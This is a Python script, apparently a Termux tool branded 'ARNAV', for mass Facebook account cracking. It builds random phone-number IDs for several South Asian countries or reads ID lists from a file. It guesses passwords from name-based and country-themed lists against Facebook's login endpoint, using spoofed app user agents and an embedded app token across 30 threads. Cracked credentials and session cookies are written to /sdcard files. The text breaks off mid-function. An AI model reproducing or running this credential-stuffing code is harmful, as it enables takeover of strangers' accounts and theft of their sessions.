#__________________| IMPORT |__________________#
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib

def clear():
        os.system('clear')
print(f'\x1b[38;5;8m❲\x1b[1;97m=\x1b[38;5;8m❳\x1b[38;5;46m INSTALLED SYSTEM ')
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    import httpx
except:
    os.system("pip install httpx")
    import httpx

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python ARNAV.py')
except:pass
#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________________| UA |__________________#
def swag():
	oppo = random.choice(["CNM632", "CPH1114", "CPH1235", "CPH1451", "CPH1615", "CPH1664", "CPH1869", "CPH1929", "CPH1985",
    "CPH2048", "CPH2107", "CPH2238", "CPH2261", "CPH2331", "CPH2332", "CPH2351", "CPH2389", "CPH2451",
    "CPH2491", "CPH2513", "CPH2515", "CPH2519", "CPH2521", "CPH2523", "CPH2525", "CPH2529", "CPH2551",
    "CPH2569", "CPH2579", "CPH2589", "CPH2591", "CPH2643", "CPH3475", "CPH3669", "CPH3682", "CPH3731",
    "CPH3776", "CPH3785", "CPH4125", "CPH4275", "CPH4299", "CPH4395", "CPH4473", "CPH4987", "CPH5286",
    "CPH5841", "CPH5947", "CPH6178", "CPH6244", "CPH6271", "CPH6316", "CPH6519", "CPH6528", "CPH6697",
    "CPH7338", "CPH7364", "CPH7382", "CPH7532", "CPH7577", "CPH7948", "CPH7991", "CPH8153", "CPH8346",
    "CPH8347", "CPH8363", "CPH8393", "CPH8467", "CPH8472", "CPH8534", "CPH8686", "CPH8893", "CPH9177",
    "CPH9226", "CPH9659", "CPH9667", "CPH9716", "CPH9763", "CPH9839", "CPH9929"])
	ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+str(oppo)+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
	return ua
#__________________| LOGO |__________________#
logo=(f"""
....###....########..##....##....###....##.....##
...##.##...##.....##.###...##...##.##...##.....##
..##...##..##.....##.####..##..##...##..##.....##
.##.....##.########..##.##.##.##.....##.##.....##
.#########.##...##...##..####.#########..##...##.
.##.....##.##....##..##...###.##.....##...##.##..
.##.....##.##.....##.##....##.##.....##....###...      ×ARNAV INXID3👾


=================================""")
#__________________| MAIN |__________________#
def menu():
        try:
                        clear()
                        print(f'{B}❲{A}1{B}❳{Y} FILE CLONING \n{B}❲{A}2{B}❳{Y} RANDOM CLONING\n{B}❲{A}3{B}❳{Y} CONTACT TOOL OWNER\n{B}❲{A}0{B}❳{Y} EXIT TOOL')
                        linex()
                        xd=input(f'{B}❲{A}?{B}❳{Y} CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'{B}❲{A}={B}❳{Y} EXAMPLE : /sdcard/XX.txt ');linex()
                                file = input(f'{B}❲{A}?{B}❳{Y} FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{B}❲{A}={B}❳{Y} FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{B}❲{A}1{B}❳{Y} METHOD {B}❲{A}M1{B}❳\n{B}❲{A}2{B}❳{Y} METHOD {B}❲{A}M2{B}❳\n{B}❲{A}3{B}❳{Y} METHOD {B}❲{A}M3{B}❳');linex()
                                mthd=input(f'{B}❲{A}?{B}❳{Y} CHOICE : ')
                                clear()
                                plist = []
                                print(f'                  PASSWORD SYSTEM');linex();print(f'{B}❲{A}1{B}❳{Y} AUTO PASSWORD CLONE\n{B}❲{A}2{B}❳{Y} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{B}❲{A}?{B}❳{Y} CHOICE : ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('First Last')
                                        plist.append('last12')
                                        plist.append('name')
                                        plist.append('last123')
                                        plist.append('last1234')
                                        plist.append('last12345')
                                        plist.append('last@')
                                        plist.append('last@@')
                                        plist.append('last@@@')
                                        plist.append('last@12345')
                                        plist.append('last@123')
                                        plist.append('first last@123')
                                        plist.append('firstfirst')
                                        plist.append('@last123')
                                        plist.append('first@123')
                                        plist.append('first@')
                                        plist.append('first@@')
                                        plist.append('first@@12345')
                                        plist.append('@first123')
                                        plist.append('first last@')
                                        plist.append('lastlast')
                                        plist.append('123456')
                                        plist.append('first12345')
                                        plist.append('first11')
                                        plist.append('first00')
		                            	
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'{B}❲{A}={B}❳{Y} PASSWORD LIMIT : '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'{B}❲{A}={B}❳{Y} EXAMPLE : firstlast{B}/{Y}first@@{B}/{Y}first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'{B}❲{A}={B}❳{Y} PASSWORD NO {i+1} :{A} '))
                                clear()
                                print(f'{B}❲{A}={B}❳{Y} CP ID SHOW (y/n) ')
                                linex()
                                cx=input(f'{B}❲{A}?{B}❳{Y} CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'{B}❲{A}={B}❳{Y} TOTAL ACCOUNT :{A} '+total_ids+f' {Y}<{A}-{Y}> METHOD :{A} M{mthd}')
                                        print(f'{B}❲{A}={B}❳{Y} USE FLIGHT MODE FOR SPEED UP')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'{B}❲{A}={B}❳{Y} THE PROCESS HAS COMPLETED')
                                print(f'{B}❲{A}={B}❳{Y} TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                input(f'{B}❲{A}={B}❳{Y} PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                randm()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/arnav.inxid3');menu()
                        elif xd in ['0','05']:
                                exit(f'{B}❲{A}={B}❳{Y} EXIT DONE ')
                        else:
                                exit(f'{B}❲{A}={B}❳{Y} OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'{B}❲{A}={B}❳{Y} NO INTERNET CONNECTION...')
                exit()
#__________________| RANDOM |__________________#
def randm():
    clear()
    print(f'{B}❲{A}1{B}❳{Y} BANGLADESH CLONING ')
    print(f'{B}❲{A}2{B}❳{Y} INDIA CLONING ')
    print(f'{B}❲{A}3{B}❳{Y} NEPAL CLONING ')
    print(f'{B}❲{A}4{B}❳{Y} PAKISTAN CLONING ')
    print(f'{B}❲{A}5{B}❳{Y} AFGHANISTAN CLONING ')
    print(f'{B}❲{A}6{B}❳{Y} GMAIL CLONING ')
    print(f'{B}❲{A}0{B}❳{Y} BACK TO MENU ');linex()
    option=input(f'{B}❲{A}?{B}❳{Y} CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
    elif option in ['3','C']:
    	nepal()
    elif option in ['4','D']:
    	pakistan()
    elif option in ['5','E']:
    	afghanistan()
    elif option in ['6','00']:
    	gmail()
    elif option in ['0','00']:
    	menu()
    else:
        exit(f'{B}❲{A}={B}❳{Y} BYE BYE ')
#__________________| BANGLADESH |__________________#
def bd():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{Y} EXAMPLE : 017 | 019 | 018 | 016 ');linex()
		code = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{Y} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{Y} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{Y} METHOD {B}❲{A}M1{B}❳{Y} \n{B}❲{A}2{B}❳{Y} METHOD {B}❲{A}M2{B}❳{Y}\n{B}❲{A}3{B}❳{Y} METHOD {B}❲{A}M3{B}❳{Y} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{Y} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{Y} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{Y} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{Y} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{Y} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{Y} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{Y} PRESS ENTER TO BACK ')
		menu()
#__________________| INDIA |__________________#
def india():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{Y} EXAMPLE : +91639 | +91934 | +91902 | +91937 ');linex()
		code = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{Y} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{Y} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{Y} METHOD {B}❲{A}M1{B}❳{Y} \n{B}❲{A}2{B}❳{Y} METHOD {B}❲{A}M2{B}❳{Y}\n{B}❲{A}3{B}❳{Y} METHOD {B}❲{A}M3{B}❳{Y} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{Y} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{Y} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{Y} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid[:8],'57273200','59039200','57575751']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{Y} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{Y} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{Y} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{Y} PRESS ENTER TO BACK ')
		menu()
#__________________| NEPAL |__________________#
def nepal():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{Y} EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
		code = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{Y} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{Y} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{Y} METHOD {B}❲{A}M1{B}❳{Y} \n{B}❲{A}2{B}❳{Y} METHOD {B}❲{A}M2{B}❳{Y}\n{B}❲{A}3{B}❳{Y} METHOD {B}❲{A}M3{B}❳{Y} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{Y} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{Y} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{Y} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'magar123','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','pokhara@123','maya1234','surkhet','tamang123','gorkha123','kathmandu12345']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{Y} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{Y} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{Y} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{Y} PRESS ENTER TO BACK ')
		menu()
#__________________| PAKISTAN |__________________#
def pakistan():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{Y} EXAMPLE : 0306 | 0335 | 0315 | 0345 ');linex()
		code = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{Y} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{Y} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{Y} METHOD {B}❲{A}M1{B}❳{Y} \n{B}❲{A}2{B}❳{Y} METHOD {B}❲{A}M2{B}❳{Y}\n{B}❲{A}3{B}❳{Y} METHOD {B}❲{A}M3{B}❳{Y} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{Y} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{Y} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{Y} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','123456','Ali khan','ali@890','khan@890','khan123']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{Y} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{Y} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{Y} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{Y} PRESS ENTER TO BACK ')
		menu()
#__________________| AFGHANISTAN |__________________#
def afghanistan():
		user=[]
		clear()
		print(f'{B}❲{A}={B}❳{Y} EXAMPLE : +9340 | +9360 | +9330 | +9350');linex()
		code = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		clear();print(f'{B}❲{A}={B}❳{Y} EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{B}❲{A}?{B}❳{Y} CHOICE  : '))
		clear()
		print(f'{B}❲{A}1{B}❳{Y} METHOD {B}❲{A}M1{B}❳{Y} \n{B}❲{A}2{B}❳{Y} METHOD {B}❲{A}M2{B}❳{Y}\n{B}❲{A}3{B}❳{Y} METHOD {B}❲{A}M3{B}❳{Y} ');linex()
		mthd = input(f'{B}❲{A}?{B}❳{Y} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'{B}❲{A}={B}❳{Y} SIM CODE :{A} {code} ')
			print(f'{B}❲{A}={B}❳{Y} TOTAL ID :{A} {tl} ')
			print(f'{B}❲{A}={B}❳{Y} USE FLIGHT MODE FOR SPEED UP');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'{B}❲{A}={B}❳{Y} THE PROCESS HAS COMPLETED')
		print(f'{B}❲{A}={B}❳{Y} TOTAL OK ID : '+str(len(oks)))
		print(f'{B}❲{A}={B}❳{Y} TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'{B}❲{A}={B}❳{Y} PRESS ENTER TO BACK ')
		menu()		
#__________________| FILE METHOD M1 |__________________#
def api1(ids,names,passlist):
        try:
                global oks,loop,sim_id,device
                sys.stdout.write(f'\r\r{B}❲{Y}ARNAV-XD{B}❳{Y} %s {B}|{Y} OK{B}|{Y}CP{Y} %s{B}|{Y}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        ua= "Dalvik/2.1.0 (Linux; U; Android 12; SM-A125F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/384.0.0.18.104;FBPN/com.facebook.orca;FBLC/lt_LT;FBBV/412138691;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-A125F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;]"
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                        "adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": ids,
                        "password": pas,
                        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_GB",
                        "client_country_code": "GB",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}

                        head = {
                        'User-Agent': ua,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'MOBILE.LTE',
                        'X-Tigon-Is-Retry': 'False',
                        'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'X-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                        url1= 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url1,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{Y}ARNAV-OK{B}❳{Y} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{X2}COOKIES{B}❳>{X2} "+coki)
                                        open('/sdcard/ARNAV-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}ARNAV-CP{B}❳{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ARNAV-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| FILE METHOD M2 |__________________#
def api2(ids,names,passlist):
        try:
                global oks,loop,sim_id
                sys.stdout.write(f'\r\r{B}❲{Y}ARNAV-XD{B}❳{Y} %s {B}|{Y} OK{B}|{Y}CP{Y} %s{B}|{Y}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
